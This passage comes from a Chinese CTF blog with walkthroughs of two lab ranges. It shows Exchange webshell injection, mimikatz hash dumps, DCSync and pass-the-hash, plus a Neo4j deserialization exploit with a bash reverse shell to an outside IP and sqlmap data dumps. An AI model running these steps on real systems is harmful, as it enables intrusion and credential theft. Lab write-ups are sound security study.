https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f\u0026amp;reason=0 状态码:200 长度:28237 标题:Outlook 314[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9:8172 状态码:404 长度:0 标题:无标题 扫到三台机子\n172.22.3.9 XIAORANG-EXC01\r172.22.3.2 DC:XIAORANG-WIN16.xiaorang.lab\r172.22.3.26 XIAORANG-PC 172.22.3.9上有一个exchange服务，有nday，直接上exprolog\n1python .\\exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab 2 3___________ __________ .__ 4\\_ _____/__ __\\______ \\_______ ____ | | ____ ____ 5 | __)_\\ \\/ /| ___/\\_ __ \\/ _ \\| | / _ \\ / ___\\ 6 | \\\u0026gt; \u0026lt; | | | | \\( \u0026lt;_\u0026gt; ) |_( \u0026lt;_\u0026gt; ) /_/ \u0026gt; 7/_______ /__/\\_ \\|____| |__| \\____/|____/\\____/\\___ / 8 \\/ \\/ /_____/ 9 10[#] Trying to get target FQDN 11[+] Got target FQDN: XIAORANG-EXC01 12[#] Trying to get target LegacyDN and ServerID 13[+] Got target LegacyDN: /o=XIAORANG LAB/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat 14[+] Got target ServerID: b5ebdaa1-b4b3-4b71-ab32-7d03b4955a75 15[#] Trying to get target user SID 16[+] Got target administrator SID: S-1-5-21-533686307-2117412543-4200729784-500 17[#] Trying to get target administrator cookie sessions 18[+] Got target administrator session ID: fefab382-b49c-4a85-a748-8cee14485956 19[+] Got target administrator canary session ID: atsaGpfQ70qSuQAOEtYUV5LqJeTxeN0IkjUqGKytbR0zbRHwhB5ynGGNyD8fBXd6AyUH2qDHj9M. 20[#] Trying to get target OABVirtualDirectory ID 21[+] Got target AOB ID: 6d8fb74b-8477-43ee-83ba-0b119205e85f 22[#] Trying to inject OABVirtualDirectory Shell 23[+] Shell are injected 24[#] Verifying OABVirtualDirectory Shell 25[+] AOB Shell verified 26[+] AOB Shell payload: http:\\/\\/ooo\\/#%3Cscript%20language=%22JScript%22%20runat=%22server%22%3Efunction%20Page_Load()%7Beval(Request%5B%22request%22%5D,%22unsafe%22);%7D%3C\\/script%3E 27[#] Trying to export OABVirtualDirectory Shell 28[+] Shell are exported 29[*] CURL Request: 30curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data \u0026#39;request=Response.Write(new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).exec(\u0026#34;whoami /all\u0026#34;).stdout.readall())\u0026#39; -k 31[*] DONE 发现可以RCE\nproxychains4 curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; --data \u0026#39;request=Response.Write(new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).exec(\u0026#34;whoami\u0026#34;).stdout.readall())\u0026#39; -k 写用户RDP上去拿flag\nnet user xrntkk abc123456 /add\rnet localgroup administrators xrntkk /add 1Yb dP 88 db dP\u0026#34;Yb 88\u0026#34;\u0026#34;Yb db 88b 88 dP\u0026#34;\u0026#34;b8 2 YbdP 88 dPYb dP Yb 88__dP dPYb 88Yb88 dP `\u0026#34; 3 dPYb 88 dP__Yb Yb dP 88\u0026#34;Yb dP__Yb 88 Y88 Yb \u0026#34;88 4dP Yb 88 dP\u0026#34;\u0026#34;\u0026#34;\u0026#34;Yb YbodP 88 Yb dP\u0026#34;\u0026#34;\u0026#34;\u0026#34;Yb 88 Y8 YboodP 5 6 7 / / 8 / / _ __ ( ) ___ 9 / / // / / // ) ) ) ) / / // ) ) 10 / / // / / // / / / / / / // / / 11/ /____/ / ((___( ( // / / / / / / ((___( ( 12 13 14 15flag02: flag{aefcc6d0-0d3c-44aa-b96c-c8ad50e6d2d4} FLAG4 信息收集一手\n这是域内的一台机子\n接着传个mimikatz，抓取哈希\n用管理员打开mimikatz\nlog\rprivilege::Debug sekurlsa::logonpasswords exit 抓到两个hash\n一个是机器用户的hash，一个是用户zhangtong\nAuthentication Id : 0 ; 10480581 (00000000:009febc5)\rSession : Interactive from 3\rUser Name : DWM-3\rDomain : Window Manager\rLogon Server : (null)\rLogon Time : 2025/4/9 20:32:31\rSID : S-1-5-90-0-3\rmsv :\r[00000003] Primary\r* Username : XIAORANG-EXC01$\r* Domain : XIAORANG\r* NTLM : 9b2081c3dc250a9b0a55c54c4dcc9cbb\r* SHA1 : 336d62cd7f3bc62aba936763ace82491e96f2eed\rAuthentication Id : 0 ; 105924 (00000000:00019dc4)\rSession : Service from 0\rUser Name : Zhangtong\rDomain : XIAORANG\rLogon Server : XIAORANG-WIN16\rLogon Time : 2025/4/9 19:36:36\rSID : S-1-5-21-533686307-2117412543-4200729784-1147\rmsv :\r[00000003] Primary\r* Username : Zhangtong\r* Domain : XIAORANG\r* NTLM : 22c7f81993e96ac83ac2f3f1903de8b4\r* SHA1 : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e\r* DPAPI : ed14c3c4ef895b1d11b04fb4e56bb83b 接下来利用system权限用bloodhound信息收集一波\nproxychains4 bloodhound-python -u \u0026#34;XIAORANG-EXC01$\u0026#34; --hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip 发现这台机子对域内的用户具有WriteDACL权限，也就是说我们可以利用机器用户给域内的用户添加dcsync权限，从而拿到域管的hash。\npython dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn \u0026#34;DC=xiaorang,DC=lab\u0026#34; -dc-ip 172.22.3.2 接下来我们就可以利用dcsync去dump域管的hash了\nproxychains4 python3 psexec.py xiaorang.lab/XIAORANG-EXC01\\$@172.22.3.9 -hashes \u0026#39;:9b2081c3dc250a9b0a55c54c4dcc9cbb\u0026#39; -codec gbk c:\\\u0026gt; .\\mimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit\r.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;XIAORANG-WIN16.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502 krbtgt b8fa79a52e918cb0cbcd1c0ede492647 514\r1137 HealthMailboxeda7a84 1e89e23e265bb7b54dc87938b1b1a131 66048\r1138 HealthMailbox33b01cf 0eff3de35019c2ee10b68f48941ac50d 66048\r1139 HealthMailbox9570292 e434c7db0f0a09de83f3d7df25ec2d2f 66048\r1140 HealthMailbox3479a75 c43965ecaa92be22c918e2604e7fbea0 66048\r1141 HealthMailbox2d45c5b 4822b67394d6d93980f8e681c452be21 66048\r1142 HealthMailboxec2d542 147734fa059848c67553dc663782e899 66048\r1143 HealthMailboxf5f7dbd e7e4f69b43b92fb37d8e9b20848e6b66 66048\r1144 HealthMailbox67dc103 4fe68d094e3e797cfc4097e5cca772eb 66048\r1145 HealthMailbox320fc73 0c3d5e9fa0b8e7a830fcf5acaebe2102 66048\r1146 Lumia 862976f8b23c13529c2fb1428e710296 512\r500 Administrator 7acbc09a6c0efd81bfa7d5a1d4238beb 512\r1000 XIAORANG-WIN16$ 5410e4604b240a6d7bab43f67637b109 532480\r1147 Zhangtong 22c7f81993e96ac83ac2f3f1903de8b4 512\r1103 XIAORANG-EXC01$ 9b2081c3dc250a9b0a55c54c4dcc9cbb 4096\r1104 XIAORANG-PC$ fc840d385551c896c88c32a65ab5c5ad 4096\r1135 HealthMailbox8446c5b a79a671473279d21ca92fcc8251ec143 66048\r1136 HealthMailbox0d5918e 0e9b8e002d34d405e866b4820dfe36eb 66048\rmimikatz(commandline) # exit\rBye! 拿到域管hash，那我们接下来就可以随意横向了\n500 Administrator 7acbc09a6c0efd81bfa7d5a1d4238beb 512 横向拿flag\nproxychains4 python3 psexec.py administrator@172.22.3.2 -hashes \u0026#39;:7acbc09a6c0efd81bfa7d5a1d4238beb\u0026#39; -codec gbk c:\\Users\\Administrator\\flag\u0026gt; type flag.txt\r____ ___.___ _____ ________ __________ _____ _______ ________\r\\ \\/ /| | / _ \\ \\_____ \\\\______ \\ / _ \\ \\ \\ / _____/\r\\ / | |/ /_\\ \\ / | \\| _/ / /_\\ \\ / | \\/ \\ ___\r/ \\ | / | \\/ | \\ | \\/ | \\/ | \\ \\_\\ \\\r/___/\\ \\|___\\____|__ /\\_______ /____|_ /\\____|__ /\\____|__ /\\______ /\r\\_/ \\/ \\/ \\/ \\/ \\/ \\/\rflag04: flag{204e2d62-c729-4840-8b25-a6c07b6aad44} 拿到flag4\nFLAG3 接下来横向去26拿flag3\nproxychains4 impacket-smbclient -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -dc-ip 172.22.3.2 use C$\rcd /users/lumia/desktop 在C:\\users\\lumia\\desktop找到一个secret.zip，我们把它get下来\nsecret.zip里面有个flag.docx\n但是secret.zip需要密码\n这里要利用上面拿到的lumia的hash，将outlook中的邮件下载下来\n1146 Lumia 862976f8b23c13529c2fb1428e710296 512 python pthexchange.py --target https://172.22.3.9 --username Lumia --password \u0026#34;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296\u0026#34; --action Download 拿到两封邮件\n第一封附件是刚刚的secret.zip，提示说用手机号解密\n第二封邮件中附件是一堆名字和手机号\n我们用手机号作为字典进行爆破\n18763918468 拿到flag3\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/","summary":"\u003cp\u003e\u003cem\u003e靶标介绍：\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eExchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。\u003c/p\u003e","title":"春秋云镜-Exchange-Writeup"},{"content":"靶标介绍：\nTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。\nFLAG1 fscan扫一下\n看到7474，neo4j网页端的默认端口\n登陆默认密码为neo4j/neo4j，登入后可以修改密码\n修改为neo4j/abc123456\n数据版本为3.4.18，打 CVE-2021-34371\nNeo4j 3.4.18 - RMI based Remote Code Execution (RCE) - Java remote Exploit\nexp\n1# Exploit Title: Neo4j 3.4.18 - RMI based Remote Code Execution (RCE) 2# Date: 7/30/21 3# Exploit Author: Christopher Ellis, Nick Gonella, Workday Inc. 4# Vendor Homepage: neo4j.com 5# Software Link: https://neo4j.com/download-thanks/?edition=community\u0026amp;release=3.4.18\u0026amp;flavour=unix 6# Version: 3.4.18 7# Tested on: Windows, Mac 8 9In older versions of Neo4j, when the shell server is enabled, RCE can be obtained via a Java deserialization exploit. In the ShellServer interface, a method setSessionVariable(Serializable paramSerializable, String paramString, Object paramObject) exists. Neo4j also has a dependency (rhino 1.7.9) with known RCE gadget chains. By crafting an object to abuse these gadget chains, one obtain RCE via the shell server. 10 11To create this from scratch using Java, you’ll need to modify the ysoserial library to include the payload found here https://github.com/mozilla/rhino/issues/520 (an update of the existing rhino gadget) as well as modify the ysoserial POM file to include the correct version of rhino. Rebuild ysoserial and include it on your exploit’s classpath. From there, you can use the ShellServer interface and associated code found in neo4j-shell-3.4.18.jar to make your client aware of the server’s method stubs. Now you should be able to call the setSessionVariable method from your exploit/client via RMI. 12In your exploit, use ysoserial to generate a payload as follows: Object payload = new RhinoGadget().getObject(COMMAND), and then call the setSessionVariable with the payload in the paramObject parameter. The other two parameters can be anything. This will cause the server to deserialize your payload, triggering the gadget chain, and running your command. 13It is worth noting that we chose to exploit this method and the paramObject parameter as this was the most direct, any method that takes in an Object (other than String or a primitave) is likely vulnerable as well. 14 15package runnable; 16 17import payloads.RhinoGadget; 18import sun.rmi.registry.RegistryImpl_Stub; 19 20import java.io.Serializable; 21import java.rmi.Naming; 22import org.neo4j.shell.ShellServer; 23 24public class ExploitB { 25 26 public static String COMMAND = \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/113.45.175.138/9001 0\u0026gt;\u0026amp;1\u0026#34;; 27 public static String TARGET = \u0026#34;rmi://39.99.229.213:1337\u0026#34;; 28 public static String TARGET_BINDING = \u0026#34;shell\u0026#34;; 29 30 public static void main (String args[]) throws Exception { 31 32 boolean validBinding = checkBinding(TARGET_BINDING, TARGET); 33 if (!validBinding) 34 { 35 System.out.println(\u0026#34;[-] No valid binding found, shell server may not be listening. Exiting\u0026#34;); 36 System.exit(0); 37 } 38 39 System.out.println(\u0026#34;[+] Found valid binding, proceeding to exploit\u0026#34;); 40 ShellServer server = (ShellServer) Naming.lookup(TARGET + \u0026#34;/\u0026#34; + TARGET_BINDING); 41 42 Object payload = new RhinoGadget().getObject(COMMAND); 43 44 //Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off 45 try { 46 server.setSessionVariable(newClientId(), \u0026#34;anything_here\u0026#34;, payload); 47 } 48 catch (Exception UnmarshalException ) { 49 System.out.println(\u0026#34;[+] Caught an unmarshalled exception, this is expected.\u0026#34;); 50 } 51 System.out.println(\u0026#34;[+] Exploit completed\u0026#34;); 52 53 } 54 55 /** 56 * Just a helper method to validate that the rmi binding we\u0026#39;re looking for is present 57 * @param bindingToCheck the binding you\u0026#39;d like to check for 58 * @param targetToCheck the rmi registry to check against 59 * @return true if the binding is present, false if not 60 */ 61 public static boolean checkBinding(String bindingToCheck, String targetToCheck) { 62 63 System.out.println(\u0026#34;Trying to enumerate server bindings: \u0026#34;); 64 try { 65 RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck); 66 67 for (String element : stub.list()) { 68 System.out.println(\u0026#34;Found binding: \u0026#34; + element); 69 if (element.equalsIgnoreCase(bindingToCheck)) 70 return true; 71 } 72 return false; 73 } 74 catch (Exception ex) 75 { 76 return false; 77 } 78 79 } 80 81 public static Serializable newClientId() { 82 return Integer.valueOf(1); 83 } 84 85} 86 或者直接用\nzwjjustdoit/CVE-2021-34371.jar: CVE-2021-34371.jar\n反弹shell\njava -jar rhino_gadget.jar rmi://39.99.229.213:1337 \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTMuNDUuMTc1LjEzOC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34; 拿到第一个flag\nneo4j@ubuntu:/$ cat /home/neo4j/f*\rcat /home/neo4j/f*\r██████████ ██ ░░░░░██░░░ ░░ ░██ ██ ██████████ █████ ░██ ░██░░██░░██░░██ ██░░░██\r░██ ░██ ░██ ░██ ░██░███████\r░██ ░██ ░██ ░██ ░██░██░░░░ ░██ ░██ ███ ░██ ░██░░██████\r░░ ░░ ░░░ ░░ ░░ ░░░░░░ flag01: flag{cd636779-1376-41a5-a2ca-9adbee764248}\rDo you know the authentication process of Kerberos? ......This will be the key to your progress. FLAG2 先信息收集一手\n1neo4j@ubuntu:/tmp$ ip addr 21: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:2f:e7:ab brd ff:ff:ff:ff:ff:ff 10 inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356731sec preferred_lft 315356731sec 12 inet6 fe80::216:3eff:fe2f:e7ab/64 scope link 13 valid_lft forever preferred_lft forever fscan扫一下内网\nfscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36 1neo4j@ubuntu:/tmp$ fscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-04-08 11:59:45] [INFO] 暴力破解线程数: 1 12[2025-04-08 11:59:45] [INFO] 开始信息扫描 13[2025-04-08 11:59:45] [INFO] CIDR范围: 172.22.6.0-172.22.6.255 14[2025-04-08 11:59:45] [INFO] 生成IP范围: 172.22.6.0.%!d(string=172.22.6.255) - %!s(MISSING).%!d(MISSING) 15[2025-04-08 11:59:45] [INFO] 解析CIDR 172.22.6.0/24 -\u0026gt; IP范围 172.22.6.0-172.22.6.255 16[2025-04-08 11:59:45] [INFO] 已排除指定主机: 1 个 17[2025-04-08 11:59:45] [INFO] 最终有效主机数量: 255 18[2025-04-08 11:59:45] [INFO] 开始主机扫描 19[2025-04-08 11:59:45] [INFO] 正在尝试无监听ICMP探测... 20[2025-04-08 11:59:45] [INFO] 当前用户权限不足,无法发送ICMP包 21[2025-04-08 11:59:45] [INFO] 切换为PING方式探测... 22[2025-04-08 11:59:45] [SUCCESS] 目标 172.22.6.12 存活 (ICMP) 23[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.25 存活 (ICMP) 24[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.38 存活 (ICMP) 25[2025-04-08 11:59:51] [INFO] 存活主机数量: 3 26[2025-04-08 11:59:51] [INFO] 有效端口数量: 65535 27[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:22 28[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:53 29[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:80 30[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:88 31[2025-04-08 11:59:51] [SUCCESS] 服务识别 172.22.6.38:22 =\u0026gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 32[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:135 33[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.12:139 34[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:139 35[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:135 36[2025-04-08 11:59:55] [SUCCESS] 端口开放 172.22.6.12:389 37[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:445 38[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.25:445 39[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:464 40[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.12:88 =\u0026gt; 41[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.38:80 =\u0026gt; [http] 42[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:593 43[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:636 44[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:593 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 45[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:636 =\u0026gt; 46[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:139 =\u0026gt; Banner:[.] 47[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.25:139 =\u0026gt; Banner:[.] 48[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3268 49[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3269 50[2025-04-08 11:59:58] [SUCCESS] 服务识别 172.22.6.12:3269 =\u0026gt; 51[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.12:3389 52[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.25:3389 53[2025-04-08 12:00:00] [SUCCESS] 服务识别 172.22.6.12:389 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 54[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.12:445 =\u0026gt; 55[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.25:445 =\u0026gt; 56[2025-04-08 12:00:02] [SUCCESS] 服务识别 172.22.6.12:464 =\u0026gt; 57[2025-04-08 12:00:03] [SUCCESS] 服务识别 172.22.6.12:3268 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 58[2025-04-08 12:00:04] [SUCCESS] 服务识别 172.22.6.25:3389 =\u0026gt; 59[2025-04-08 12:00:15] [SUCCESS] 端口开放 172.22.6.12:9389 60[2025-04-08 12:00:20] [SUCCESS] 服务识别 172.22.6.12:9389 =\u0026gt; 61[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.12:15774 62[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.25:15774 63[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:15774 =\u0026gt; 64[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.25:15774 =\u0026gt; 65[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:53 =\u0026gt; 66[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.12:135 =\u0026gt; 67[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.25:135 =\u0026gt; 68[2025-04-08 12:01:04] [SUCCESS] 服务识别 172.22.6.12:3389 =\u0026gt; 69[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.25:47001 70[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.12:47001 71[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.25:47001 =\u0026gt; [http] 72[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.12:47001 =\u0026gt; [http] 73[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49664 74[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49666 75[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49665 76[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49665 77[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49664 78[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49667 79[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49667 80[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49666 81[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49668 82[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49669 83[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49670 84[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49671 85[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49674 86[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49675 87[2025-04-08 12:02:22] [SUCCESS] 服务识别 172.22.6.12:49674 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 88[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49675 89[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49676 90[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49678 91[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49687 92[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49772 93[2025-04-08 12:02:34] [SUCCESS] 端口开放 172.22.6.12:54921 94[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49664 =\u0026gt; 95[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49666 =\u0026gt; 96[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49665 =\u0026gt; 97[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49665 =\u0026gt; 98[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49664 =\u0026gt; 99[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49667 =\u0026gt; 100[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49667 =\u0026gt; 101[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49666 =\u0026gt; 102[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49668 =\u0026gt; 103[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49669 =\u0026gt; 104[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49670 =\u0026gt; 105[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49671 =\u0026gt; 106[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49675 =\u0026gt; 107[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49675 =\u0026gt; 108[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49676 =\u0026gt; 109[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49678 =\u0026gt; 110[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49687 =\u0026gt; 111[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49772 =\u0026gt; 112[2025-04-08 12:03:29] [SUCCESS] 服务识别 172.22.6.12:54921 =\u0026gt; 113[2025-04-08 12:03:29] [INFO] 存活端口数量: 43 114[2025-04-08 12:03:29] [INFO] 开始漏洞扫描 115[2025-04-08 12:03:29] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, ssh, webpoc, webtitle 116[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果 117目标主机: 172.22.6.12 118主机名: DC-PROGAME 119发现的网络接口: 120 IPv4地址: 121 └─ 172.22.6.12 122[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果 123目标主机: 172.22.6.25 124主机名: WIN2019 125发现的网络接口: 126 IPv4地址: 127 └─ 172.22.6.25 128[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.25 XIAORANG\\WIN2019 129[2025-04-08 12:03:29] [SUCCESS] 网站标题 http://172.22.6.38 状态码:200 长度:1531 标题:后台登录 130[2025-04-08 12:03:29] [INFO] 系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393] 131[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.12 DC:DC-PROGAME.xiaorang.lab Windows Server 2016 Datacenter 14393 扫出来三台机子\n172.22.6.12 DC-PROGAME [Windows Server 2016 Datacenter 14393]\r172.22.6.25 WIN2019\r172.22.6.38 先来看172.22.6.38\n有一个后台登录\n这里存在sql注入，用sqlmap把所有数据dump下来\nproxychains4 sqlmap -u http://172.22.6.38/index.php -data \u0026#34;username=admin\u0026amp;password=*\u0026#34; --dump FLAG2\n[1 entry]\r+----+--------------------------------------------+\r| id | flag02 |\r+----+--------------------------------------------+\r| 1 | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |\r+----+--------------------------------------------+ 用户信息\n这里只显示最后256行结果，但是sqlmap会将完整结果储存为csv\n1[12:28:43] [INFO] table \u0026#39;oa_db.oa_users\u0026#39; dumped to CSV file \u0026#39;/root/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv\u0026#39; [500 entries]\r+-----+----------------------------+-------------+-----------------+\r| id | email | phone | username |\r+-----+----------------------------+-------------+-----------------+\r[12:28:43] [WARNING] console output will be trimmed to last 256 rows due to large table size\r| 245 | chenyan@xiaorang.lab | 18281528743 | CHEN YAN |\r| 246 | tanggui@xiaorang.lab | 18060615547 | TANG GUI |\r| 247 | buning@xiaorang.lab | 13046481392 | BU NING |\r| 248 | beishu@xiaorang.lab | 18268508400 | BEI SHU |\r| 249 | shushi@xiaorang.lab | 17770383196 | 